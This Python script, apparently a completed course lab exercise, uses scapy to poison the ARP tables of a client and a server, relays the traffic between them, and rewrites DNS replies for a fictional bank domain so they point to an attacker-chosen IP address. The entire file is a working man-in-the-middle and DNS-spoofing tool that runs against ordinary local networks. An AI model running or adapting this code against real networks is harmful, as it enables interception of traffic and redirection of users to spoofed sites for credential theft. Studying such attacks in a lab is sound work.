# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=1, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    # Send an ARP to get mac addr
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP)
    ans, _ = srp(pkt, timeout=1, verbose=0)
    debug(f"MAC address of {IP} is: {ans[0][1].hwsrc}")
    return ans[0][1].hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # TODO: Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    pkt = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op="is-at")
    send(pkt, verbose=0)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    pkt = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op="is-at")
    send(pkt, verbose=0)

# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, attackerIP
    if packet.haslayer(IP):
        dstIP = packet[IP].dst
        srcIP = packet[IP].src
        if dstIP == attackerIP or srcIP == attackerIP or packet[Ether].src == attackerMAC:
            return
        dstMAC = packet[Ether].dst
        if dstIP == clientIP:
            dstMAC = clientMAC
        elif dstIP == serverIP:
            dstMAC = serverMAC
        else:
            packet.show()
            return
        packet[Ether].src = attackerMAC
        packet[Ether].dst = dstMAC

        if packet.haslayer(IP) and packet[IP].dst == clientIP and packet[IP].src == serverIP and packet.haslayer(DNS) and packet[DNS].ancount > 0 and packet[DNS].an[0].rrname.decode() == "www.bankofbailey.com.":
            spoof_ip = "10.4.63.200"
            an = packet[DNS].an
            an.rdata = spoof_ip
            dns = packet[DNS]
            dns.an = an
            dns.ancount = 1
            packet = Ether(src=packet[Ether].src, dst=packet[Ether].dst)/IP(dst=packet[IP].dst, src=packet[IP].src)/UDP(dport=packet[UDP].dport)/dns

        sendp(packet, verbose=0)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
